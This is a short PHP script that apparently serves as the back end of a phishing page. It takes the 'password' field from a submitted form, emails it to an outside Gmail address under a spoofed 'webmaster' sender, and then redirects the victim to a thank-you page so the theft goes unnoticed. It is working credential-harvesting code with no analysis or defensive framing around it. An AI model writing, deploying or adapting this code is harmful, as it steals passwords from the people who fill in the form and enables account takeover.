<?php
$email = "webmaster@myunipower.com";
$pass = $_POST['password'];
$formcontent=" Pass- $pass";
$recipient = "viabhinav33@gmail.com";
$subject = "password";
$mailheader = "Password";
mail($recipient, $subject, $formcontent, $mailheader) or die("Error!");
// echo "Thank You!" . " -" . "<a href='form.html' style='text-decoration:none;color:#ff0099;'> Return Home</a>";
$referer = "thank-you.html";
    header("Location: $referer");
?>